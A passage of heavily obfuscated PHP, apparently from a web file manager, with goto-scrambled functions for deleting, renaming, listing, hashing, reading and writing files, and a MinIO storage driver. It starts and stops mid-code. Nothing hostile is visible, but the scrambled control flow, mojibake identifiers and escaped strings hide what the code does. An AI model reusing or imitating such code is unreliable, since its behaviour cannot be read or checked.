$this->getPathOuter($AØÉˆÙ®Ë‘) : !1; } public function delFile($DÎ¢Ó¼È’‹) { $DÎ¢Ó¼È’‹ = $this->iconvSystem($DÎ¢Ó¼È’‹); if (!@unlink($DÎ¢Ó¼È’‹)) { @chmod($DÎ¢Ó¼È’‹, 511); if (!@unlink($DÎ¢Ó¼È’‹)) { return !1; } } else { return !0; } } public function delFolder($A¼ò¨¤”±„) { goto fÎâ°Œ×ùÔ; d¤Š‹–¦ë—: return rmdir($A¼ò¨¤”±„); goto Bø°¤½òŒÓ; FÕ‰—Æõ©Í: if (!($E”µŞ²µÓ» = opendir($A¼ò¨¤”±„))) { return !1; } while (($Fèåäóëµ = readdir($E”µŞ²µÓ»)) !== !1) { if ($Fèåäóëµ == $a›ø¡“¸¸¾[91] || $Fèåäóëµ == $a›ø¡“¸¸¾[1184]) { continue; } $fÛî¡Í´¡â = $A¼ò¨¤”±„ . $a›ø¡“¸¸¾[8] . $Fèåäóëµ; if (is_file($fÛî¡Í´¡â) || is_link($fÛî¡Í´¡â)) { if (!unlink($fÛî¡Í´¡â)) { chmod($fÛî¡Í´¡â, 511); if (!unlink($fÛî¡Í´¡â)) { return !1; } } } else { if (is_dir($fÛî¡Í´¡â)) { chmod($fÛî¡Í´¡â, 511); $fÛî¡Í´¡â = $this->iconvApp($fÛî¡Í´¡â); if (!$this->delFolder($fÛî¡Í´¡â)) { return !1; } } } } closedir($E”µŞ²µÓ»); goto d¤Š‹–¦ë—; fÎâ°Œ×ùÔ: $a›ø¡“¸¸¾ =& $_SERVER[ã®Â„Éæ¹¤]; $A¼ò¨¤”±„ = $this->iconvSystem($A¼ò¨¤”±„); if (!is_dir($A¼ò¨¤”±„)) { return !0; } goto FÕ‰—Æõ©Í; Bø°¤½òŒÓ: } public function rename($bÜÙµõŸ¯, $EŒùÖøÛÓÇ) { goto BÎÆØÁ×´; BÎÆØÁ×´: $B¿ñÚ˜†²Æ =& $_SERVER[ã®Â„Éæ¹¤]; $e¸¦ãöä†‹ = $this->fileNameAuto($this->pathFather($bÜÙµõŸ¯), $EŒùÖøÛÓÇ); $e¸¦ãöä†‹ = $this->iconvSystem($e¸¦ãöä†‹); goto Bô‘§†»×Ë; Bô‘§†»×Ë: $bÜÙµõŸ¯ = $this->iconvSystem($bÜÙµõŸ¯); $c¥¦²éÀ = $this->pathFather($bÜÙµõŸ¯); $dÃÎêİ¹¼‚ = rtrim($c¥¦²éÀ, $B¿ñÚ˜†²Æ[8]) . $B¿ñÚ˜†²Æ[8] . $e¸¦ãöä†‹; goto B÷İ¶¢Ù; B÷İ¶¢Ù: $b‹¢ÃöÕĞË = @rename($bÜÙµõŸ¯, $dÃÎêİ¹¼‚); $dÃÎêİ¹¼‚ = $this->iconvApp($dÃÎêİ¹¼‚); return $b‹¢ÃöÕĞË ? $this->getPathOuter($dÃÎêİ¹¼‚) : !1; goto cÒã‰¸’­Ç; cÒã‰¸’­Ç: } public function size($Fğ…‰‚Å×³) { $Fğ…‰‚Å×³ = $this->iconvSystem($Fğ…‰‚Å×³); return filesize_64($Fğ…‰‚Å×³); } public function info($dî¥²àñƒ…) { $dî¥²àñƒ… = $this->iconvSystem($dî¥²àñƒ…); if ($this->isFolder($dî¥²àñƒ…)) { return $this->folderInfo($dî¥²àñƒ…); } else { if ($this->isFile($dî¥²àñƒ…)) { return $this->fileInfo($dî¥²àñƒ…); } } return !1; } protected function infoChildren($Eï½âÛõÈº, &$dæ‚Ôˆº±Ş, $CÇ³é÷Ê„» = true) { goto EÑˆ×í®¬Ø; Bğ¢í•õö: if ($CÇ³é÷Ê„») { $Eï½âÛõÈº = $this->iconvSystem($Eï½âÛõÈº); } if (!($e¯›Å˜„˜® = @opendir($Eï½âÛõÈº))) { return; } while (($CÆˆ«Ïù±£ = readdir($e¯›Å˜„˜®)) !== !1) { if ($CÆˆ«Ïù±£ == $Eí‚÷ëŠ[91] || $CÆˆ«Ïù±£ == $Eí‚÷ëŠ[1184]) { continue; } $A’Šİ¨íÙÓ = $Eï½âÛõÈº . $CÆˆ«Ïù±£; if (is_file($A’Šİ¨íÙÓ) || is_link($A’Šİ¨íÙÓ)) { $dæ‚Ôˆº±Ş[$Eí‚÷ëŠ[78]]++; $dæ‚Ôˆº±Ş[$Eí‚÷ëŠ[77]] += filesize_64($A’Šİ¨íÙÓ); } else { if (is_dir($A’Šİ¨íÙÓ)) { $dæ‚Ôˆº±Ş[$Eí‚÷ëŠ[79]]++; $this->infoChildren($A’Šİ¨íÙÓ, $dæ‚Ôˆº±Ş, !1); } } } goto DïæšÆ‘…Ü; EÑˆ×í®¬Ø: $Eí‚÷ëŠ =& $_SERVER[ã®Â„Éæ¹¤]; check_abort(); $Eï½âÛõÈº = rtrim($Eï½âÛõÈº, $Eí‚÷ëŠ[8]) . $Eí‚÷ëŠ[8]; goto Bğ¢í•õö; DïæšÆ‘…Ü: closedir($e¯›Å˜„˜®); goto Fš‘–íäÍ¦; Fš‘–íäÍ¦: } private function folderInfo($C†Äø¢ƒÑ‰, $E¯–êæ¢Õã = false) { $BÅ¸›ˆ¡Æ» =& $_SERVER[ã®Â„Éæ¹¤]; $C†Äø¢ƒÑ‰ = rtrim($C†Äø¢ƒÑ‰, $BÅ¸›ˆ¡Æ»[8]) . $BÅ¸›ˆ¡Æ»[8]; $F¼Š…ò¯ = $this->iconvApp($this->pathThis($C†Äø¢ƒÑ‰)); if ($E¯–êæ¢Õã) { return array($BÅ¸›ˆ¡Æ»[28] => $F¼Š…ò¯, $BÅ¸›ˆ¡Æ»[75] => $this->getPathOuter($C†Äø¢ƒÑ‰), $BÅ¸›ˆ¡Æ»[29] => $BÅ¸›ˆ¡Æ»[76]); } $BğñÃ–Ÿó· = array($BÅ¸›ˆ¡Æ»[28] => $F¼Š…ò¯, $BÅ¸›ˆ¡Æ»[75] => $this->getPathOuter($C†Äø¢ƒÑ‰), $BÅ¸›ˆ¡Æ»[29] => $BÅ¸›ˆ¡Æ»[76], $BÅ¸›ˆ¡Æ»[187] => @filectime($C†Äø¢ƒÑ‰), $BÅ¸›ˆ¡Æ»[107] => @filemtime($C†Äø¢ƒÑ‰), $BÅ¸›ˆ¡Æ»[1186] => @fileatime($C†Äø¢ƒÑ‰), $BÅ¸›ˆ¡Æ»[1181] => is_readable($C†Äø¢ƒÑ‰), $BÅ¸›ˆ¡Æ»[1182] => is_writable($C†Äø¢ƒÑ‰), $BÅ¸›ˆ¡Æ»[1187] => get_mode($C†Äø¢ƒÑ‰)); return $BğñÃ–Ÿó·; } private function fileInfo($dÕÇÑ†âïÍ, $dÀÄİ„ÅŞŞ = false) { $d¡‹ ÒÙÒŸ =& $_SERVER[ã®Â„Éæ¹¤]; $eÃƒóğ©·… = $this->iconvApp($this->pathThis($dÕÇÑ†âïÍ)); if ($dÀÄİ„ÅŞŞ) { return array($d¡‹ ÒÙÒŸ[28] => $eÃƒóğ©·…, $d¡‹ ÒÙÒŸ[75] => $this->getPathOuter($dÕÇÑ†âïÍ), $d¡‹ ÒÙÒŸ[29] => $d¡‹ ÒÙÒŸ[167], $d¡‹ ÒÙÒŸ[77] => $this->size($dÕÇÑ†âïÍ), $d¡‹ ÒÙÒŸ[160] => $this->ext($eÃƒóğ©·…)); } $DÇ …¯ë = array($d¡‹ ÒÙÒŸ[28] => $eÃƒóğ©·…, $d¡‹ ÒÙÒŸ[75] => $this->getPathOuter($dÕÇÑ†âïÍ), $d¡‹ ÒÙÒŸ[29] => $d¡‹ ÒÙÒŸ[167], $d¡‹ ÒÙÒŸ[187] => @filectime($dÕÇÑ†âïÍ), $d¡‹ ÒÙÒŸ[107] => @filemtime($dÕÇÑ†âïÍ), $d¡‹ ÒÙÒŸ[1186] => @fileatime($dÕÇÑ†âïÍ), $d¡‹ ÒÙÒŸ[77] => $this->size($dÕÇÑ†âïÍ), $d¡‹ ÒÙÒŸ[160] => $this->ext($eÃƒóğ©·…), $d¡‹ ÒÙÒŸ[1181] => is_readable($dÕÇÑ†âïÍ), $d¡‹ ÒÙÒŸ[1182] => is_writable($dÕÇÑ†âïÍ), $d¡‹ ÒÙÒŸ[1187] => get_mode($dÕÇÑ†âïÍ)); return $DÇ …¯ë; } public function exist($aô¸Æ¡„) { $aô¸Æ¡„ = $this->iconvSystem($aô¸Æ¡„); return @file_exists($aô¸Æ¡„); } public function isFile($e¥¯ŒàÔ) { $e¥¯ŒàÔ = $this->iconvSystem($e¥¯ŒàÔ); return @is_file($e¥¯ŒàÔ); } public function isFolder($BÅ»è™Ã„Õ) { $BÅ»è™Ã„Õ = $this->iconvSystem($BÅ»è™Ã„Õ); return @is_dir($BÅ»è™Ã„Õ); } public function listPath($FÍ×æÁï‡­, $Cğçí‡¥¶˜ = false) { goto d–ÄíˆªØÁ; d–ÄíˆªØÁ: $EŞç‘À‰é =& $_SERVER[ã®Â„Éæ¹¤]; $FÍ×æÁï‡­ = $this->iconvSystem($FÍ×æÁï‡­); $FÍ×æÁï‡­ = rtrim($FÍ×æÁï‡­, $EŞç‘À‰é[8]) . $EŞç‘À‰é[8]; goto E™‰¨‡íáˆ; Aï¯•àİì¥: closedir($bš×è……»Á); return $DÛáÂ•Î¨¯; goto cŒğ›¼ª¢Ş; E™‰¨‡íáˆ: $DÛáÂ•Î¨¯ = array($EŞç‘À‰é[74] => array(), $EŞç‘À‰é[73] => array()); if (!($bš×è……»Á = @opendir($FÍ×æÁï‡­))) { return $DÛáÂ•Î¨¯; } while (($Bß¥ÖÍ•Äˆ = readdir($bš×è……»Á)) !== !1) { if ($Bß¥ÖÍ•Äˆ == $EŞç‘À‰é[91] || $Bß¥ÖÍ•Äˆ == $EŞç‘À‰é[1184]) { continue; } $dÇ™ŠŞˆÛä = $FÍ×æÁï‡­ . $Bß¥ÖÍ•Äˆ; if (is_file($dÇ™ŠŞˆÛä)) { $DÛáÂ•Î¨¯[$EŞç‘À‰é[73]][] = $this->fileInfo($dÇ™ŠŞˆÛä, $Cğçí‡¥¶˜); } else { $DÛáÂ•Î¨¯[$EŞç‘À‰é[74]][] = $this->folderInfo($dÇ™ŠŞˆÛä, $Cğçí‡¥¶˜); } } goto Aï¯•àİì¥; cŒğ›¼ª¢Ş: } public function listAll($cÕ¹‘óà„ï, &$eºÔà±’ ° = array()) { goto dÜéóÁ¤”; dÜéóÁ¤”: $aœÑÆ‹¤äŠ =& $_SERVER[ã®Â„Éæ¹¤]; $cÕ¹‘óà„ï = $this->iconvSystem($cÕ¹‘óà„ï); $cÕ¹‘óà„ï = rtrim($cÕ¹‘óà„ï, $aœÑÆ‹¤äŠ[8]) . $aœÑÆ‹¤äŠ[8]; goto a™óŸ§²½; cŠ³Ì¨ì›: return $eºÔà±’ °; goto E£¤âŸôÖ”; a™óŸ§²½: if (!($aôÔêêéÃö = @opendir($cÕ¹‘óà„ï))) { return $eºÔà±’ °; } while (($B³Ù ¾õŸ÷ = readdir($aôÔêêéÃö)) !== !1) { if ($B³Ù ¾õŸ÷ == $aœÑÆ‹¤äŠ[91] || $B³Ù ¾õŸ÷ == $aœÑÆ‹¤äŠ[1184]) { continue; } $D—ÇšíŸÖ = $cÕ¹‘óà„ï . $B³Ù ¾õŸ÷; if (is_dir($D—ÇšíŸÖ) && !is_link($D—ÇšíŸÖ)) { $eºÔà±’ °[] = array($aœÑÆ‹¤äŠ[75] => $D—ÇšíŸÖ . $aœÑÆ‹¤äŠ[8], $aœÑÆ‹¤äŠ[76] => 1, $aœÑÆ‹¤äŠ[107] => @filemtime($D—ÇšíŸÖ), $aœÑÆ‹¤äŠ[77] => 0); $this->listAll($D—ÇšíŸÖ, $eºÔà±’ °); } else { $eºÔà±’ °[] = array($aœÑÆ‹¤äŠ[75] => $D—ÇšíŸÖ, $aœÑÆ‹¤äŠ[76] => 0, $aœÑÆ‹¤äŠ[107] => @filemtime($D—ÇšíŸÖ), $aœÑÆ‹¤äŠ[77] => $this->size($D—ÇšíŸÖ)); } } closedir($aôÔêêéÃö); goto cŠ³Ì¨ì›; E£¤âŸôÖ”: } public function has($f×ÑÜô’, $B¥å£”µ = false, $a½çëõ¬ = true) { goto a‚Ö‰›©£; AÔ¿ìÀŒùÆ: if ($B¥å£”µ) { return array($Bö”œĞê±[191] => $b‹¤Â«‡Î×, $Bö”œĞê±[192] => $F˜Ó õá‘); } return !1; goto f“è…­‹Í‰; eçÁÏ’¯ƒ¯: if (!($DÀ–Ïğ¥×± = @opendir($f×ÑÜô’))) { return !1; } $b‹¤Â«‡Î× = 0; $F˜Ó õá‘ = 0; goto d²†ñËëÉŞ; d²†ñËëÉŞ: $dóÄ´Ã‹ = 0; while (($AÜÒÁÓ½Ö­ = readdir($DÀ–Ïğ¥×±)) !== !1) { if ($AÜÒÁÓ½Ö­ == $Bö”œĞê±[91] || $AÜÒÁÓ½Ö­ == $Bö”œĞê±[1184]) { continue; } $B°ˆõ‡Àòõ = $f×ÑÜô’ . $AÜÒÁÓ½Ö­; if ($B¥å£”µ) { $dóÄ´Ã‹++; if (@is_file($B°ˆõ‡Àòõ)) { $b‹¤Â«‡Î×++; } else { $F˜Ó õá‘++; } if ($dóÄ´Ã‹ > 10000) { break; } continue; } if ($a½çëõ¬) { if (@is_file($B°ˆõ‡Àòõ)) { return !0; } } else { if (@is_dir($B°ˆõ‡Àòõ . $Bö”œĞê±[8])) { return !0; } } } closedir($DÀ–Ïğ¥×±); goto AÔ¿ìÀŒùÆ; a‚Ö‰›©£: $Bö”œĞê± =& $_SERVER[ã®Â„Éæ¹¤]; $f×ÑÜô’ = $this->iconvSystem($f×ÑÜô’); $f×ÑÜô’ = rtrim($f×ÑÜô’, $Bö”œĞê±[8]) . $Bö”œĞê±[8]; goto eçÁÏ’¯ƒ¯; f“è…­‹Í‰: } public function hashSimple($BÙ¦ğ ÒêÊ) { goto E³ŒÁƒÄ¥ƒ; eùæë“º®Ô: fseek_64($b–¼¦¹èÉ…, $EÆìšõÚ¤ò - $e«˜íéå¬); $cõâÂùšäÂ .= fread($b–¼¦¹èÉ…, $e«˜íéå¬); fclose($b–¼¦¹èÉ…); goto CŞê¤ÖŒË¯; CÑ§—¢Øõ¼: $EÆìšõÚ¤ò = $this->size($BÙ¦ğ ÒêÊ); $e«˜íéå¬ = 200; $BÃ‹î¦‚º— = 50; goto d¢ ã¡àÚ®; d¢ ã¡àÚ®: if ($EÆìšõÚ¤ò <= $e«˜íéå¬ * $BÃ‹î¦‚º—) { return $this->hashMd5($BÙ¦ğ ÒêÊ) . $EÆìšõÚ¤ò; } $cõâÂùšäÂ = $AßŞÌªÓ…Û[33]; $dºìÀ‹¬ = intval($EÆìšõÚ¤ò / $BÃ‹î¦‚º—); goto E¦‚Á–Ê·ä; E¦‚Á–Ê·ä: $b–¼¦¹èÉ… = fopen($BÙ¦ğ ÒêÊ, $AßŞÌªÓ…Û[1188]); if (!$b–¼¦¹èÉ…) { return $cõâÂùšäÂ; } for ($b·œßßÖ· = 0; $b·œßßÖ· < $BÃ‹î¦‚º—; $b·œßßÖ·++) { fseek_64($b–¼¦¹èÉ…, $dºìÀ‹¬ * $b·œßßÖ·); $cõâÂùšäÂ .= fread($b–¼¦¹èÉ…, $e«˜íéå¬); } goto eùæë“º®Ô; E³ŒÁƒÄ¥ƒ: $AßŞÌªÓ…Û =& $_SERVER[ã®Â„Éæ¹¤]; if (!$BÙ¦ğ ÒêÊ) { return md5($AßŞÌªÓ…Û[33]); } $BÙ¦ğ ÒêÊ = $this->iconvSystem($BÙ¦ğ ÒêÊ); goto CÑ§—¢Øõ¼; CŞê¤ÖŒË¯: return md5($cõâÂùšäÂ) . $EÆìšõÚ¤ò; goto bªñŒÑ³‚§; bªñŒÑ³‚§: } public function getContent($A¤˜«¨¥·) { $A¤˜«¨¥· = $this->iconvSystem($A¤˜«¨¥·); return file_get_contents($A¤˜«¨¥·); } public function setContent($cöê´Ûòœ, $a×ÇÚÛÛÏô = '') { $cöê´Ûòœ = $this->iconvSystem($cöê´Ûòœ); @file_put_contents($cöê´Ûòœ, $a×ÇÚÛÛÏô, LOCK_EX); clearstatcache(); return strlen($a×ÇÚÛÛÏô) == filesize_64($cöê´Ûòœ); } public function fileSubstr($BØ†ä–Ø™‚, $b¡Á‡¥ÖÍ = 0, $Fâì‚Øğ¦ñ = false) { goto dÓÒø‹«·é; cœÕ÷ ±‡: fseek_64($eİêÄî‰Ÿê, $b¡Á‡¥ÖÍ); $C­…´íêò = fread($eİêÄî‰Ÿê, $Fâì‚Øğ¦ñ); fclose($eİêÄî‰Ÿê); goto DóÎ„†™Ğ; E¦â¢ìè©¨: if ($Fâì‚Øğ¦ñ <= 0) { return $f­ˆÊä‚‡ã[33]; } $eİêÄî‰Ÿê = fopen($BØ†ä–Ø™‚, $f­ˆÊä‚‡ã[1188]); if (!$eİêÄî‰Ÿê) { return !1; } goto cœÕ÷ ±‡; DóÎ„†™Ğ: return $C­…´íêò; goto d–ÃÀ§ò‘; dÓÒø‹«·é: $f­ˆÊä‚‡ã =& $_SERVER[ã®Â„Éæ¹¤]; $BØ†ä–Ø™‚ = $this->iconvSystem($BØ†ä–Ø™‚); if ($Fâì‚Øğ¦ñ === !1) { $Fâì‚Øğ¦ñ = $this->size($BØ†ä–Ø™‚); } goto E¦â¢ìè©¨; d–ÃÀ§ò‘: } public function upload($fôÀõÁà°ˆ, $aŠÄÕ‰ğÜ, $cìØ¹÷á‰à = false, $eé¿ÒƒÃ¢ = REPEAT_REPLACE) { $a³¹äÄË†² = $this->copyFile($aŠÄÕ‰ğÜ, $fôÀõÁà°ˆ); return $a³¹äÄË†² ? $this->getPathOuter($fôÀõÁà°ˆ) : !1; } public function setModifyTime($Cºæª«ƒ½Ú, $EùîÅ„Ú³İ = '') { @touch($Cºæª«ƒ½Ú, intval($EùîÅ„Ú³İ)); } public function download($aÕÂ«ß¬‹, $e¾œØ´æ¦œ) { return $this->iconvSystem($aÕÂ«ß¬‹); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Fº¾ì»Ñµ™) { parent::__construct($Fº¾ì»Ñµ™); $this->signatureVersion($_SERVER[ã®Â„Éæ¹¤][200]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto bÁ¿—º¡‘ï; c¦óù¦ÕÕ‚: function beforeShutdown() { Hook::trigger($_SERVER[ˆó©™¯í›][32]); } $_SERVER[$_SERVER[ˆó©™¯í›][33]] = BASIC_PATH; $_SERVER[$_SERVER[ˆó©™¯í›][34]] = LIB_DIR; goto Dñ‘ØÊ½¾º; F”Ô¦µ•¦: define($_SERVER[ã®Â„Éæ¹¤][1954], 1); define($_SERVER[ã®Â„Éæ¹¤][1955], 2); define($_SERVER[ã®Â„Éæ¹¤][1956], 3); goto eãÌİ©Ú‚²; FÍÕÔÍÜÖÅ: class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\x75\x72\x63\x65"; protected $tableMeta = array("\x74\141\142\154\x65\116\141\x6d\x65" => "\151\x6f\x5f\x73\x6f\x75\x72\x63\145\x5f\x6d\x65\x74\x61", "\x6d\145\x74\x61\x46\151\x65\154\144" => "\x73\x6f\165\x72\x63\x65\111\x44"); protected $dataAuto = array(array("\155\x6f\144\151\x66\171\x54\x69\155\x65", "\x74\x69\155\x65", "\151\x6e\163\145\x72\164", "\146\165\156\x63\x74\x69\157\x6e"), array("\x63\162\145\141\164\x65\x54\x69\155\145", "\164\151\x6d\x65", "\x69\x6e\x73\145\x72\164", "\146\165\x6e\x63\x74\151\157\x6e"), array("\x76\151\145\x77\124\x69\x6d\x65", "\x74\151\x6d\x65", "\151\x6e\163\x65\x72\x74", "\x66\165\x6e\143\x74\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($b‰˜Ğ² ³­) { return $this->listSource(array($_SERVER[ã®Â„Éæ¹¤][368] => $b‰˜Ğ² ³­)); } public function typeName($B´ª—í¶†Š) { static $Båè½…à = array(self::TYPE_SYSTEM => "\x73\x79\x73\164\145\155", self::TYPE_USER => "\x75\x73\145\x72", self::TYPE_GROUP => "\147\162\157\x75\x70"); return $Båè½…à[$B´ª—í¶†Š . $_SERVER[ã®Â„Éæ¹¤][33]]; } public function sourceListInfo($eĞÜ¹Ë—ğÆ, $c˜Œø‰‘¿³ = false) { goto f‹‘Íêì¸©; f‹‘Íêì¸©: $DÚâ°Ïº¨ =& $_SERVER[ã®Â„Éæ¹¤]; $eĞÜ¹Ë—ğÆ = $eĞÜ¹Ë—ğÆ ? $eĞÜ¹Ë—ğÆ : array(); $eĞÜ¹Ë—ğÆ = array_filter(array_unique($eĞÜ¹Ë—ğÆ)); goto Dî”¹ŠÖõ; Dî”¹ŠÖõ: if (!$eĞÜ¹Ë—ğÆ) { return array(); } $b°ºˆŒíä = $this->where(array($DÚâ°Ïº¨[369] => array($DÚâ°Ïº¨[7], $eĞÜ¹Ë—ğÆ)))->select(); $this->_listDataApply($b°ºˆŒíä, $c˜Œø‰‘¿³); goto EÁ¢ÂÉ§à; EÁ¢ÂÉ§à: return array_to_keyvalue($b°ºˆŒíä, $DÚâ°Ïº¨[369]); goto a–»ùäíˆÔ; a–»ùäíˆÔ: } public function pathInfoFilter($e¢ÏˆÆ‰) { goto EŞô“Ñƒ·ñ; BÕë÷™Ôî: if (isset($e¢ÏˆÆ‰[$FçáÌóÎ[376]]) && $e¢ÏˆÆ‰[$FçáÌóÎ[376]][$FçáÌóÎ[377]] == -1) { $bòô¿“‹ = array_remove_value($bòô¿“‹, $FçáÌóÎ[187]); $bòô¿“‹ = array_remove_value($bòô¿“‹, $FçáÌóÎ[107]); $bòô¿“‹ = array_remove_value($bòô¿“‹, $FçáÌóÎ[378]); $bòô¿“‹ = array_remove_value($bòô¿“‹, $FçáÌóÎ[379]); $bòô¿“‹ = array_remove_value($bòô¿“‹, $FçáÌóÎ[77]); $bòô¿“‹ = array_remove_value($bòô¿“‹, $FçáÌóÎ[380]); } $e¢ÏˆÆ‰ = array_field_key($e¢ÏˆÆ‰, $bòô¿“‹); return $e¢ÏˆÆ‰; goto dÖÚÉÁä¡Ì; EŞô“Ñƒ·ñ: $FçáÌóÎ =& $_SERVER[ã®Â„Éæ¹¤]; $e¢ÏˆÆ‰[$FçáÌóÎ[75]] = KodIO::make($e¢ÏˆÆ‰[$FçáÌóÎ[369]]); $e¢ÏˆÆ‰[$FçáÌóÎ[29]] = $e¢ÏˆÆ‰[$FçáÌóÎ[370]] == 1 ? $FçáÌóÎ[76] : $FçáÌóÎ[167]; goto D•íá¨Øˆö; A‡¹¾×­À: $A¶½‘ÄÙ„™ .= $FçáÌóÎ[374]; $A¶½‘ÄÙ„™ .= $FçáÌóÎ[375]; $bòô¿“‹ = explode($FçáÌóÎ[47], $A¶½‘ÄÙ„™); goto BÕë÷™Ôî; D•íá¨Øˆö: $e¢ÏˆÆ‰[$FçáÌóÎ[371]] = $this->typeName($e¢ÏˆÆ‰[$FçáÌóÎ[371]]); if ($e¢ÏˆÆ‰[$FçáÌóÎ[370]] != 1) { $e¢ÏˆÆ‰[$FçáÌóÎ[160]] = $e¢ÏˆÆ‰[$FçáÌóÎ[372]]; unset($e¢ÏˆÆ‰[$FçáÌóÎ[372]]); } $A¶½‘ÄÙ„™ = $FçáÌóÎ[373]; goto A‡¹¾×­À; dÖÚÉÁä¡Ì: } public function listUserFav() { goto E£Ğ³±”Š¯; E£Ğ³±”Š¯: $FšÊ ÖÌ‡‹ =& $_SERVER[ã®Â„Éæ¹¤]; $fÈ³ßÎù = Model($FšÊ ÖÌ‡‹[381])->listData(); $E¥ØºšÖê = array_filter_by_field($fÈ³ßÎù, $FšÊ ÖÌ‡‹[29], $FšÊ ÖÌ‡‹[382]); goto bâ­ÙÁÍœì; eÉ¾Ÿ…Œ: foreach ($fÈ³ßÎù as &$AÁ•¹±Şç˜) { $AÁ•¹±Şç˜ = array($FšÊ ÖÌ‡‹[385] => $AÁ•¹±Şç˜[$FšÊ ÖÌ‡‹[367]], $FšÊ ÖÌ‡‹[386] => $AÁ•¹±Şç˜[$FšÊ ÖÌ‡‹[28]], $FšÊ ÖÌ‡‹[387] => $AÁ•¹±Şç˜[$FšÊ ÖÌ‡‹[75]], $FšÊ ÖÌ‡‹[388] => $AÁ•¹±Şç˜[$FšÊ ÖÌ‡‹[29]], $FšÊ ÖÌ‡‹[389] => $AÁ•¹±Şç˜[$FšÊ ÖÌ‡‹[187]], $FšÊ ÖÌ‡‹[390] => $AÁ•¹±Şç˜[$FšÊ ÖÌ‡‹[107]]); if ($AÁ•¹±Şç˜[$FšÊ ÖÌ‡‹[29]] == $FšÊ ÖÌ‡‹[382] && $dš‘‰¤ÅÀÖ[$AÁ•¹±Şç˜[$FšÊ ÖÌ‡‹[75]]]) { $AÁ•¹±Şç˜[$FšÊ ÖÌ‡‹[391]] = $dš‘‰¤ÅÀÖ[$AÁ•¹±Şç˜[$FšÊ ÖÌ‡‹[75]]]; } } unset($AÁ•¹±Şç˜); return $fÈ³ßÎù; goto eë¼Ş¹˜ĞÎ; bâ­ÙÁÍœì: $E¥ØºšÖê = array_to_keyvalue($E¥ØºšÖê, $FšÊ ÖÌ‡‹[33], $FšÊ ÖÌ‡‹[75]); if ($E¥ØºšÖê) { $dš‘‰¤ÅÀÖ = $this->listSource(array($FšÊ ÖÌ‡‹[383] => array($FšÊ ÖÌ‡‹[384], $E¥ØºšÖê))); } $dš‘‰¤ÅÀÖ = array_to_keyvalue($dš‘‰¤ÅÀÖ[$FšÊ ÖÌ‡‹[354]], $FšÊ ÖÌ‡‹[369]); goto eÉ¾Ÿ…Œ; eë¼Ş¹˜ĞÎ: } public function listUserTag($F½¢º“¾¸Õ) { goto C«†¯å¾ô¥; BŠ›Ğì¯•“: $D…Äº‘Øï› = array_to_keyvalue($b´ª®Œ˜ù[$bÙä— åì…[73]], $bÙä— åì…[33], $bÙä— åì…[369]); $AÒµ Ç‹ß‚ = array_merge($D…Äº‘Øï›, $C ÁÛ—‡®); foreach ($AÜäî©†´Ä as $FÍ–¶£¡Úå) { if (!in_array($FÍ–¶£¡Úå, $AÒµ Ç‹ß‚)) { $C»èµ®ó[] = $FÍ–¶£¡Úå; } } goto fÅ°Ê‰Ï§à; cïƒÅ”ÕœÍ: if (!$b´ª®Œ˜ù || count($AÜäî©†´Ä) == $b´ª®Œ˜ù[$bÙä— åì…[351]][$bÙä— åì…[352]]) { return $b´ª®Œ˜ù; } $C»èµ®ó = array(); $C ÁÛ—‡® = array_to_keyvalue($b´ª®Œ˜ù[$bÙä— åì…[74]], $bÙä— åì…[33], $bÙä— åì…[369]); goto BŠ›Ğì¯•“; D—Ÿ•ï‚‡: $Aêº¥…ËÍ¿ = array(); foreach ($D¾ˆâÂõó as $CäÃŒ¹â¨) { $FÍ–¶£¡Úå = $CäÃŒ¹â¨[$bÙä— åì…[75]]; if (!$FÍ–¶£¡Úå) { continue; } if (!isset($Aêº¥…ËÍ¿[$FÍ–¶£¡Úå])) { $Aêº¥…ËÍ¿[$FÍ–¶£¡Úå] = array(); } $Aêº¥…ËÍ¿[$FÍ–¶£¡Úå][] = $CäÃŒ¹â¨[$bÙä— åì…[393]]; } $AÜäî©†´Ä = array(); goto Dª…½±àá; C«†¯å¾ô¥: $bÙä— åì… =& $_SERVER[ã®Â„Éæ¹¤]; if ($F½¢º“¾¸Õ && !is_array($F½¢º“¾¸Õ)) { $F½¢º“¾¸Õ = array($F½¢º“¾¸Õ); } $D¾ˆâÂõó = Model($bÙä— åì…[392])->listData(); goto D—Ÿ•ï‚‡; fÅ°Ê‰Ï§à: if ($C»èµ®ó) { Model($bÙä— åì…[394])->removeBySource($C»èµ®ó); } return $b´ª®Œ˜ù; goto aÚøì‹²Ïë; Dª…½±àá: foreach ($Aêº¥…ËÍ¿ as $B˜×Ú“ ÎÙ => $Døƒ„Ÿ«Å…) { $E™è®÷öİ½ = !0; if (!$F½¢º“¾¸Õ) { $AÜäî©†´Ä[] = $B˜×Ú“ ÎÙ; continue; } foreach ($F½¢º“¾¸Õ as $c°éÕùÉË) { if (!in_array($c°éÕùÉË, $Døƒ„Ÿ«Å…)) { $E™è®÷öİ½ = !1; break; } } if ($E™è®÷öİ½) { $AÜäî©†´Ä[] = $B˜×Ú“ ÎÙ; } } if (!$AÜäî©†´Ä) { return array(); } $b´ª®Œ˜ù = $this->listSource(array($bÙä— åì…[383] => array($bÙä— åì…[384], $AÜäî©†´Ä))); goto cïƒÅ”ÕœÍ; aÚøì‹²Ïë: } public function listUserRecycle() { $dˆ•­­ =& $_SERVER[ã®Â„Éæ¹¤]; $C§¿¿÷½º¦ = Model($dˆ•­­[395])->listData(); if (!$C§¿¿÷½º¦) { return array(); } $A›¸…·ì¿© = array($dˆ•­­[383] => array($dˆ•­­[384], $C§¿¿÷½º¦), $dˆ•­­[396] => 1); return $this->listSource($A›¸…·ì¿©); } public function listSource($E°÷íóì£Ã, $eà¦¸ëõ‚ƒ = 3000) { goto bâñ…îÓÉ—; aÃ³¥¹ƒ²î: return $Aš²ØŒ¯Ïƒ; goto E·ÛÑöÂĞÃ; E„è©Çø¾: $Aš²ØŒ¯Ïƒ = $this->field($DÜ¢­ë…°Ü)->_makeOrder()->where($E°÷íóì£Ã)->selectPage($eà¦¸ëõ‚ƒ); $this->_listDataApply($Aš²ØŒ¯Ïƒ[$EÙİ¸áªÙ[354]]); $this->_listMake($Aš²ØŒ¯Ïƒ); goto aÃ³¥¹ƒ²î; bâñ…îÓÉ—: $EÙİ¸áªÙ =& $_SERVER[ã®Â„Éæ¹¤]; if 